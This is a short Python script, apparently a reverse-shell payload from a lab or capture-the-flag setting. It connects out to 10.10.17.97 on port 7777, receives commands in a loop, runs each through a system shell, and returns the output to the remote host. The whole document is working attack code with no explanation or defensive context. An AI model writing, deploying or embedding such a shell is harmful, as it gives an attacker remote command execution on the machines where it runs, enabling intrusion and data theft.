import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(('10.10.17.97', 7777)) 

while True: 
    command = s.recv(1024) 
    win_lin_shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send( win_lin_shell.stdout.read() )
    s.send( win_lin_shell.stderr.read() )
